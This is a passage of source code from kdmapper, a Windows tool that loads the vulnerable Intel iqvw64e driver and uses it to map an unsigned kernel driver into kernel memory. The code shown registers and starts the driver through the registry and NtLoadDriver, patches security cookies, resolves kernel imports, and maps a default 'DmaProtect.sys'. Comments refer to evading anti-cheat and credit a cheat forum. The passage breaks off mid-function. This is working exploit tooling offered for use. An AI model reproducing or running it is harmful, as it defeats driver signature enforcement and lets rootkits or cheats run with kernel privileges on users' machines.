			else if (mode == AllocationMode::AllocateIndependentPages)
			{
				free_status = intel_driver::MmFreeIndependentPages(iqvw64e_device_handle, realBase, image_size);
			}
			else {
				free_status = intel_driver::FreePool(iqvw64e_device_handle, realBase);
			}

			if (free_status) {
				Log(L"[+] Memory has been released" << std::endl);
			}
			else {
				Log(L"[-] WARNING: Failed to free memory!" << std::endl);
			}
		}



		VirtualFree(local_image_base, 0, MEM_RELEASE);
		return realBase;

	} while (false);


	VirtualFree(local_image_base, 0, MEM_RELEASE);

	intel_driver::FreePool(iqvw64e_device_handle, kernel_image_base);

	return 0;
}

void kdmapper::RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta) {
	for (const auto& current_reloc : relocs) {
		for (auto i = 0u; i < current_reloc.count; ++i) {
			const uint16_t type = current_reloc.item[i] >> 12;
			const uint16_t offset = current_reloc.item[i] & 0xFFF;

			if (type == IMAGE_REL_BASED_DIR64)
				*reinterpret_cast<uint64_t*>(current_reloc.address + offset) += delta;
		}
	}
}

// Fix cookie by @Jerem584
bool kdmapper::FixSecurityCookie(void* local_image, uint64_t kernel_image_base)
{
	auto headers = portable_executable::GetNtHeaders(local_image);
	if (!headers)
		return false;

	auto load_config_directory = headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
	if (!load_config_directory)
	{
		Log(L"[+] Load config directory wasn't found, probably StackCookie not defined, fix cookie skipped" << std::endl);
		return true;
	}
	
	auto load_config_struct = (PIMAGE_LOAD_CONFIG_DIRECTORY)((uintptr_t)local_image + load_config_directory);
	auto stack_cookie = load_config_struct->SecurityCookie;
	if (!stack_cookie)
	{
		Log(L"[+] StackCookie not defined, fix cookie skipped" << std::endl);
		return true; // as I said, it is not an error and we should allow that behavior
	}

	stack_cookie = stack_cookie - (uintptr_t)kernel_image_base + (uintptr_t)local_image; //since our local image is already relocated the base returned will be kernel address

	if (*(uintptr_t*)(stack_cookie) != 0x2B992DDFA232) {
		Log(L"[-] StackCookie already fixed!? this probably wrong" << std::endl);
		return false;
	}

	Log(L"[+] Fixing stack cookie" << std::endl);

	auto new_cookie = 0x2B992DDFA232 ^ GetCurrentProcessId() ^ GetCurrentThreadId(); // here we don't really care about the value of stack cookie, it will still works and produce nice result
	if (new_cookie == 0x2B992DDFA232)
		new_cookie = 0x2B992DDFA233;

	*(uintptr_t*)(stack_cookie) = new_cookie; // the _security_cookie_complement will be init by the driver itself if they use crt
	return true;
}

bool kdmapper::ResolveImports(HANDLE iqvw64e_device_handle, portable_executable::vec_imports imports) {
	for (const auto& current_import : imports) {
		ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
		if (!Module) {
#if !defined(DISABLE_OUTPUT)
			std::cout << "[-] Dependency " << current_import.module_name << " wasn't found" << std::endl;
#endif
			return false;
		}

		for (auto& current_function_data : current_import.function_datas) {
			uint64_t function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, Module, current_function_data.name);

			if (!function_address) {
				//Lets try with ntoskrnl
				if (Module != intel_driver::ntoskrnlAddr) {
					function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, intel_driver::ntoskrnlAddr, current_function_data.name);
					if (!function_address) {
#if !defined(DISABLE_OUTPUT)
						std::cout << "[-] Failed to resolve import " << current_function_data.name << " (" << current_import.module_name << ")" << std::endl;
#endif
						return false;
					}
				}
			}

			*current_function_data.address = function_address;
		}
	}

	return true;
}

```

`kdmapper/kdmapper/kdmapper.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <stdint.h>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>

#include "portable_executable.hpp"
#include "utils.hpp"
#include "nt.hpp"
#include "intel_driver.hpp"

#define PAGE_SIZE 0x1000

namespace kdmapper
{
	enum class AllocationMode
	{
		AllocatePool,
		AllocateMdl,
		AllocateIndependentPages
	};

	typedef bool (*mapCallback)(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize, ULONG64 mdlptr);

	//Note: if you set PassAllocationAddressAsFirstParam as true, param1 will be ignored
	uint64_t MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 param1 = 0, ULONG64 param2 = 0, bool free = false, bool destroyHeader = true, AllocationMode mode = AllocationMode::AllocatePool, bool PassAllocationAddressAsFirstParam = false, mapCallback callback = nullptr, NTSTATUS* exitCode = nullptr);
	void RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta);
	bool FixSecurityCookie(void* local_image, uint64_t kernel_image_base);
	bool ResolveImports(HANDLE iqvw64e_device_handle, portable_executable::vec_imports imports);
	uint64_t AllocIndependentPages(HANDLE device_handle, uint32_t size);
	uint64_t AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t* mdlPtr);
}
```

`kdmapper/kdmapper/kdmapper.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{518E0636-BA8F-459D-ACAC-81BD33475E3E}</ProjectGuid>
    <RootNamespace>kdmapper</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <TreatWarningAsError>false</TreatWarningAsError>
    </ClCompile>
    <Link>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <AdditionalDependencies>version.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <TreatWarningAsError>false</TreatWarningAsError>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <AdditionalDependencies>version.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="intel_driver.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="kdmapper.cpp" />
    <ClCompile Include="portable_executable.cpp" />
    <ClCompile Include="service.cpp" />
    <ClCompile Include="utils.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="intel_driver.hpp" />
    <ClInclude Include="intel_driver_resource.hpp" />
    <ClInclude Include="kdmapper.hpp" />
    <ClInclude Include="nt.hpp" />
    <ClInclude Include="portable_executable.hpp" />
    <ClInclude Include="service.hpp" />
    <ClInclude Include="utils.hpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`kdmapper/kdmapper/kdmapper.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <ClCompile Include="intel_driver.cpp" />
    <ClCompile Include="kdmapper.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="portable_executable.cpp" />
    <ClCompile Include="service.cpp" />
    <ClCompile Include="utils.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="utils.hpp" />
    <ClInclude Include="intel_driver.hpp" />
    <ClInclude Include="intel_driver_resource.hpp" />
    <ClInclude Include="kdmapper.hpp" />
    <ClInclude Include="nt.hpp" />
    <ClInclude Include="portable_executable.hpp" />
    <ClInclude Include="service.hpp" />
  </ItemGroup>
</Project>
```

`kdmapper/kdmapper/main.cpp`:

```cpp
#include "kdmapper.hpp"

HANDLE iqvw64e_device_handle;

LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
	if (ExceptionInfo && ExceptionInfo->ExceptionRecord)
		Log(L"[!!] Crash at addr 0x" << ExceptionInfo->ExceptionRecord->ExceptionAddress << L" by 0x" << std::hex << ExceptionInfo->ExceptionRecord->ExceptionCode << std::endl);
	else
		Log(L"[!!] Crash" << std::endl);

	if (iqvw64e_device_handle)
		intel_driver::Unload(iqvw64e_device_handle);

	return EXCEPTION_EXECUTE_HANDLER;
}

int paramExists(const int argc, wchar_t** argv, const wchar_t* param) {
	size_t plen = wcslen(param);
	for (int i = 1; i < argc; i++) {
		if (wcslen(argv[i]) == plen + 1ull && _wcsicmp(&argv[i][1], param) == 0 && argv[i][0] == '/') { // with slash
			return i;
		}
		else if (wcslen(argv[i]) == plen + 2ull && _wcsicmp(&argv[i][2], param) == 0 && argv[i][0] == '-' && argv[i][1] == '-') { // with double dash
			return i;
		}
	}
	return -1;
}

void help() {
	Log(L"\r\n\r\n[!] Incorrect Usage!" << std::endl);
	Log(L"[+] Usage: kdmapper.exe [--free][--mdl][--PassAllocationPtr] driver" << std::endl);
}

bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize, ULONG64 mdlptr) {
	UNREFERENCED_PARAMETER(param1);
	UNREFERENCED_PARAMETER(param2);
	UNREFERENCED_PARAMETER(allocationPtr);
	UNREFERENCED_PARAMETER(allocationSize);
	UNREFERENCED_PARAMETER(mdlptr);
	Log("[+] Callback example called" << std::endl);
	
	/*
	This callback occurs before call driver entry and
	can be usefull to pass more customized params in 
	the last step of the mapping procedure since you 
	know now the mapping address and other things
	*/
	return true;
}

int wmain(const int argc, wchar_t** argv) {
	SetUnhandledExceptionFilter(SimplestCrashHandler);

	bool passAllocationPtr = true;

	if (passAllocationPtr) {
		Log(L"[+] Pass Allocation Ptr as first param enabled" << std::endl);
	}

	int drvIndex = -1;
	for (int i = 1; i < argc; i++) {
		if (std::filesystem::path(argv[i]).extension().string().compare(".sys") == 0) {
			drvIndex = i;
			break;
		}
	}

	std::wstring driver_path = L"";

	if (drvIndex <= 0) {
		driver_path = L"DmaProtect.sys";
	}
	else {
		driver_path = argv[drvIndex];
	}

	if (!std::filesystem::exists(driver_path)) {
		Log(L"[-] File " << driver_path << L" doesn't exist" << std::endl);
		return -1;
	}

	iqvw64e_device_handle = intel_driver::Load();

	if (iqvw64e_device_handle == INVALID_HANDLE_VALUE)
		return -1;

	std::vector<uint8_t> raw_image = { 0 };
	if (!utils::ReadFileToMemory(driver_path, &raw_image)) {
		Log(L"[-] Failed to read image to memory" << std::endl);
		intel_driver::Unload(iqvw64e_device_handle);
		return -1;
	}

	kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;

	NTSTATUS exitCode = 0;
	if (!kdmapper::MapDriver(iqvw64e_device_handle, raw_image.data(), 0, 0, false, false, mode, passAllocationPtr, callbackExample, &exitCode)) {
		Log(L"[-] Failed to map " << driver_path << std::endl);
		intel_driver::Unload(iqvw64e_device_handle);
		return -1;
	}

	if (!intel_driver::Unload(iqvw64e_device_handle)) {
		Log(L"[-] Warning failed to fully unload vulnerable driver " << std::endl);
	}
	Log(L"[+] success" << std::endl);
}
```

`kdmapper/kdmapper/nt.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

namespace nt
{
	constexpr auto PAGE_SIZE = 0x1000;
	constexpr auto STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

	constexpr auto SystemModuleInformation = 11;
	constexpr auto SystemHandleInformation = 16;
	constexpr auto SystemExtendedHandleInformation = 64;
	
	typedef NTSTATUS(*NtLoadDriver)(PUNICODE_STRING DriverServiceName);
	typedef NTSTATUS(*NtUnloadDriver)(PUNICODE_STRING DriverServiceName);
	typedef NTSTATUS(*RtlAdjustPrivilege)(_In_ ULONG Privilege, _In_ BOOLEAN Enable, _In_ BOOLEAN Client, _Out_ PBOOLEAN WasEnabled);

	typedef struct _SYSTEM_HANDLE
	{
		PVOID Object;
		HANDLE UniqueProcessId;
		HANDLE HandleValue;
		ULONG GrantedAccess;
		USHORT CreatorBackTraceIndex;
		USHORT ObjectTypeIndex;
		ULONG HandleAttributes;
		ULONG Reserved;
	} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

	typedef struct _SYSTEM_HANDLE_INFORMATION_EX
	{
		ULONG_PTR HandleCount;
		ULONG_PTR Reserved;
		SYSTEM_HANDLE Handles[1];
	} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

	//Thanks to Pvt Comfy for remember to update this https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type
	typedef enum class _POOL_TYPE {
		NonPagedPool,
		NonPagedPoolExecute = NonPagedPool,
		PagedPool,
		NonPagedPoolMustSucceed = NonPagedPool + 2,
		DontUseThisType,
		NonPagedPoolCacheAligned = NonPagedPool + 4,
		PagedPoolCacheAligned,
		NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
		MaxPoolType,
		NonPagedPoolBase = 0,
		NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
		NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
		NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
		NonPagedPoolSession = 32,
		PagedPoolSession = NonPagedPoolSession + 1,
		NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
		DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
		NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
		PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
		NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
		NonPagedPoolNx = 512,
		NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
		NonPagedPoolSessionNx = NonPagedPoolNx + 32,
	} POOL_TYPE;

	typedef struct _RTL_PROCESS_MODULE_INFORMATION
	{
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

	typedef struct _RTL_PROCESS_MODULES
	{
		ULONG NumberOfModules;
		RTL_PROCESS_MODULE_INFORMATION Modules[1];
	} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

	/*added by psec*/
	typedef enum _MEMORY_CACHING_TYPE_ORIG {
		MmFrameBufferCached = 2
	} MEMORY_CACHING_TYPE_ORIG;

	typedef enum _MEMORY_CACHING_TYPE {
		MmNonCached = FALSE,
		MmCached = TRUE,
		MmWriteCombined = MmFrameBufferCached,
		MmHardwareCoherentCached,
		MmNonCachedUnordered,       // IA64
		MmUSWCCached,
		MmMaximumCacheType,
		MmNotMapped = -1
	} MEMORY_CACHING_TYPE;

	typedef CCHAR KPROCESSOR_MODE;

	typedef enum _MODE {
		KernelMode,
		UserMode,
		MaximumMode
	} MODE;

	typedef enum _MM_PAGE_PRIORITY {
		LowPagePriority,
		NormalPagePriority = 16,
		HighPagePriority = 32
	} MM_PAGE_PRIORITY;
	/**/
}

```

`kdmapper/kdmapper/portable_executable.cpp`:

```cpp
#include "portable_executable.hpp"

PIMAGE_NT_HEADERS64 portable_executable::GetNtHeaders(void* image_base) {
	const auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(image_base);

	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
		return nullptr;

	const auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uint64_t>(image_base) + dos_header->e_lfanew);

	if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
		return nullptr;

	return nt_headers;
}

portable_executable::vec_relocs portable_executable::GetRelocs(void* image_base) {
	const PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);

	if (!nt_headers)
		return {};

	vec_relocs relocs;
	DWORD reloc_va = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

	if (!reloc_va) //Fix from @greetmark of UnknownCheats Forum
		return {};

	auto current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(image_base) + reloc_va);
	const auto reloc_end = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(current_base_relocation) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

	while (current_base_relocation < reloc_end && current_base_relocation->SizeOfBlock) {
		RelocInfo reloc_info;

		reloc_info.address = reinterpret_cast<uint64_t>(image_base) + current_base_relocation->VirtualAddress;
		reloc_info.item = reinterpret_cast<uint16_t*>(reinterpret_cast<uint64_t>(current_base_relocation) + sizeof(IMAGE_BASE_RELOCATION));
		reloc_info.count = (current_base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);

		relocs.push_back(reloc_info);

		current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(current_base_relocation) + current_base_relocation->SizeOfBlock);
	}

	return relocs;
}

portable_executable::vec_imports portable_executable::GetImports(void* image_base) {
	const PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);

	if (!nt_headers)
		return {};

	DWORD import_va = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	//not imports necesary
	if (!import_va)
		return {};

	vec_imports imports;

	auto current_import_descriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<uint64_t>(image_base) + import_va);

	while (current_import_descriptor->FirstThunk) {
		ImportInfo import_info;

		import_info.module_name = std::string(reinterpret_cast<char*>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->Name));

		auto current_first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->FirstThunk);
		auto current_originalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->OriginalFirstThunk);

		while (current_originalFirstThunk->u1.Function) {
			ImportFunctionInfo import_function_data;

			auto thunk_data = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<uint64_t>(image_base) + current_originalFirstThunk->u1.AddressOfData);

			import_function_data.name = thunk_data->Name;
			import_function_data.address = &current_first_thunk->u1.Function;

			import_info.function_datas.push_back(import_function_data);

			++current_originalFirstThunk;
			++current_first_thunk;
		}

		imports.push_back(import_info);
		++current_import_descriptor;
	}

	return imports;
}
```

`kdmapper/kdmapper/portable_executable.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <stdint.h>
#include <vector>
#include <string>

namespace portable_executable
{
	struct RelocInfo
	{
		uint64_t address;
		uint16_t* item;
		uint32_t count;
	};

	struct ImportFunctionInfo
	{
		std::string name;
		uint64_t* address;
	};

	struct ImportInfo
	{
		std::string module_name;
		std::vector<ImportFunctionInfo> function_datas;
	};

	using vec_sections = std::vector<IMAGE_SECTION_HEADER>;
	using vec_relocs = std::vector<RelocInfo>;
	using vec_imports = std::vector<ImportInfo>;

	PIMAGE_NT_HEADERS64 GetNtHeaders(void* image_base);
	vec_relocs GetRelocs(void* image_base);
	vec_imports GetImports(void* image_base);
}
```

`kdmapper/kdmapper/service.cpp`:

```cpp
#include "service.hpp"

bool service::RegisterAndStart(const std::wstring& driver_path) {
	const static DWORD ServiceTypeKernel = 1;
	const std::wstring driver_name = intel_driver::GetDriverNameW();
	const std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
	const std::wstring nPath = L"\\??\\" + driver_path;

	HKEY dservice;
	LSTATUS status = RegCreateKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice); //Returns Ok if already exists
	if (status != ERROR_SUCCESS) {
		Log("[-] Can't create service key" << std::endl);
		return false;
	}

	status = RegSetKeyValueW(dservice, NULL, L"ImagePath", REG_EXPAND_SZ, nPath.c_str(), (DWORD)(nPath.size()*sizeof(wchar_t)));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(dservice);
		Log("[-] Can't create 'ImagePath' registry value" << std::endl);
		return false;
	}
	
	status = RegSetKeyValueW(dservice, NULL, L"Type", REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(dservice);
		Log("[-] Can't create 'Type' registry value" << std::endl);
		return false;
	}
	
	RegCloseKey(dservice);

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL) {
		return false;
	}

	auto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	auto NtLoadDriver = (nt::NtLoadDriver)GetProcAddress(ntdll, "NtLoadDriver");

	ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status)) {
		Log("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator." << std::endl);
		return false;
	}

	std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
	UNICODE_STRING serviceStr;
	RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

	Status = NtLoadDriver(&serviceStr);
	Log("[+] NtLoadDriver Status 0x" << std::hex << Status << std::endl);
	
	//Never should occur since kdmapper checks for "IsRunning" driver before
	if (Status == 0xC000010E) {// STATUS_IMAGE_ALREADY_LOADED
		return true;
	}
	
	return NT_SUCCESS(Status);
}

bool service::StopAndRemove(const std::wstring& driver_name) {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
		return false;

	std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
	UNICODE_STRING serviceStr;
	RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

	HKEY driver_service;
	std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
	LSTATUS status = RegOpenKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &driver_service);
	if (status != ERROR_SUCCESS) {
		if (status == ERROR_FILE_NOT_FOUND) {
			return true;
		}
		return false;
	}
	RegCloseKey(driver_service);

	auto NtUnloadDriver = (nt::NtUnloadDriver)GetProcAddress(ntdll, "NtUnloadDriver");
	NTSTATUS st = NtUnloadDriver(&serviceStr);
	Log("[+] NtUnloadDriver Status 0x" << std::hex << st << std::endl);
	if (st != 0x0) {
		Log("[-] Driver Unload Failed!!" << std::endl);
		status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
		return false; //lets consider unload fail as error because can cause problems with anti cheats later
	}
	

	status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
	if (status != ERROR_SUCCESS) {
		return false;
	}
	return true;
}

```

`kdmapper/kdmapper/service.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <string>
#include <filesystem>
#include "intel_driver.hpp"

namespace service
{
	bool RegisterAndStart(const std::wstring& driver_path);
	bool StopAndRemove(const std::wstring& driver_name);
};
```

`kdmapper/kdmapper/utils.cpp`:

```cpp
#include "utils.hpp"

std::wstring utils::GetFullTempPath() {
	wchar_t temp_directory[MAX_PATH + 1] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathW(sizeof(temp_directory) / 2, temp_directory);
	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH + 1) {
		Log(L"[-] Failed to get temp path" << std::endl);
		return L"";
	}
	if (temp_directory[wcslen(temp_directory) - 1] == L'\\')
		temp_directory[wcslen(temp_directory) - 1] = 0x0;

	return std::wstring(temp_directory);
}

bool utils::ReadFileToMemory(const std::wstring& file_path, std::vector<uint8_t>* out_buffer) {
	std::ifstream file_ifstream(file_path, std::ios::binary);

	if (!file_ifstream)
		return false;

	out_buffer->assign((std::istreambuf_iterator<char>(file_ifstream)), std::istreambuf_iterator<char>());
	file_ifstream.close();

	return true;
}

bool utils::CreateFileFromMemory(const std::wstring& desired_file_path, const char* address, size_t size) {
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size)) {
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	return true;
}

uint64_t utils::GetKernelModuleAddress(const std::string& module_name) {
	void* buffer = nullptr;
	DWORD buffer_size = 0;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status)) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return 0;
	}

	const auto modules = static_cast<nt::PRTL_PROCESS_MODULES>(buffer);
	if (!modules)
		return 0;

	for (auto i = 0u; i < modules->NumberOfModules; ++i) {
		const std::string current_module_name = std::string(reinterpret_cast<char*>(modules->Modules[i].FullPathName) + modules->Modules[i].OffsetToFileName);

		if (!_stricmp(current_module_name.c_str(), module_name.c_str()))
		{
			const uint64_t result = reinterpret_cast<uint64_t>(modules->Modules[i].ImageBase);

			VirtualFree(buffer, 0, MEM_RELEASE);
			return result;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return 0;
}

BOOLEAN utils::bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask) {
	for (; *szMask; ++szMask, ++pData, ++bMask)
		if (*szMask == 'x' && *pData != *bMask)
			return 0;
	return (*szMask) == 0;
}

uintptr_t utils::FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	size_t max_len = dwLen - strlen(szMask);
	for (uintptr_t i = 0; i < max_len; i++)
		if (bDataCompare((BYTE*)(dwAddress + i), bMask, szMask))
			return (uintptr_t)(dwAddress + i);
	return 0;
}

PVOID utils::FindSection(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	size_t namelength = strlen(sectionName);
	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)(modulePtr + ((PIMAGE_DOS_HEADER)modulePtr)->e_lfanew);
